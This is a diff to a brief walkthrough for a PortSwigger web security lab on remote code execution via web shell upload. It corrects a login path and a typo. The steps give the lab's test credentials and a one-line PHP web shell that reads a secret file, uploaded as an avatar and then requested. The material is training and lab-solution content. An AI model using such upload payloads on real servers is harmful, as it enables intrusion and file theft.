@@ -1,5 +1,5 @@
 # Lab link: https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-web-shell-upload
 
-1. Login at /my-account using credentials: "wiener:peter"
-2. Upload php payloadl: "<?php echo file_get_contents('/home/carlos/secret'); ?>", at /my-account/avatar
+1. Login at /login using credentials: "wiener:peter"
+2. Upload php payload: "<?php echo file_get_contents('/home/carlos/secret'); ?>", at /my-account/avatar
 3. Access your malicious file at "/files/avatars/payload.php", to read the "/home/carlos/secret" from web server
